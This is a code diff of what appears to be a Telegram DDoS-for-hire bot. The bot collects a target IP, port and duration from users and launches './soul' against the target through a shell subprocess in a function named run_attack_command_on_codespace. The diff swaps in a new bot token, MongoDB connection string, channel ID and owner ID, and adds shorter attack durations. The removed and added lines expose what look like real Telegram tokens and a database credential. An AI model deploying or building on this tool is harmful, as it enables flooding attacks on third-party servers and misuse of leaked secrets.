@@ -8,15 +8,15 @@ from telebot.types import ReplyKeyboardMarkup, KeyboardButton
 from threading import Thread
 from datetime import datetime, timedelta
 
-TOKEN = "7350522142:AAFookihpKff0mFwksI2Pc2cy3NwzRNiruw"
-MONGO_URI = "mongodb+srv://Bishal:Bishal@bishal.dffybpx.mongodb.net/?retryWrites=true&w=majority&appName=Bishal"
+TOKEN = "7440303835:AAF42qJzskXzg3QmVXv35kK7WQleYzH-9uI"
+MONGO_URI = "mongodb+srv://pritammandal0786:<db_password>@cluster0.g24wi.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"
 
 # Setup logging
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 
 
 client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
-db = client['zoya']
+db = client['ninja']
 users_collection = db.users
 codes_collection = db.codes  
 
@@ -29,9 +29,9 @@ REQUEST_INTERVAL = 1
 blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
 running_processes = []
 REMOTE_HOST = '4.213.71.147'
-CHANNEL_ID = -1002149443669
-VALID_DURATIONS = [240, 480, 620, 860, 1000, 1240, 1480, 1620, 1860, 2000]
-BOT_OWNER_ID = 5510109123
+CHANNEL_ID = -1002162993601
+VALID_DURATIONS = [80,180,240, 480, 620, 860, 1000, 1240, 1480, 1620, 1860, 2000]
+BOT_OWNER_ID = 1240179115
 def generate_unique_code():
     import random
     import string
@@ -41,7 +41,7 @@ async def start_asyncio_loop():
         await asyncio.sleep(REQUEST_INTERVAL)
 
 async def run_attack_command_on_codespace(message, target_ip, target_port, duration):
-    command = f"./soul {target_ip} {target_port} {duration} 60"
+    command = f"./soul {target_ip} {target_port} {duration} 30"
     try:
         process = await asyncio.create_subprocess_shell(
             command,
@@ -163,7 +163,7 @@ def process_port(message, target_ip):
             bot.send_message(message.chat.id, "*Pʟᴇᴀsᴇ Eɴᴛᴇʀ Vᴀʟɪᴅ Pᴏʀᴛ*", parse_mode='Markdown')
             return
 
-        bot.send_message(message.chat.id, "*Eɴᴛᴇʀ Tʜᴇ Dᴜʀᴀᴛɪᴏɴ (240, 480, 620, 860, 1000, 1240, 1480, 1620, 1860, 2000 Seconds):*", parse_mode='Markdown')
+        bot.send_message(message.chat.id, "*Eɴᴛᴇʀ Tʜᴇ Dᴜʀᴀᴛɪᴏɴ (80,180,240, 480, 620, 860, 1000, 1240, 1480, 1620, 1860, 2000 Seconds):*", parse_mode='Markdown')
         bot.register_next_step_handler(message, process_duration, target_ip, target_port)
     except ValueError:
         bot.send_message(message.chat.id, "*Eʀʀᴏʀ*")
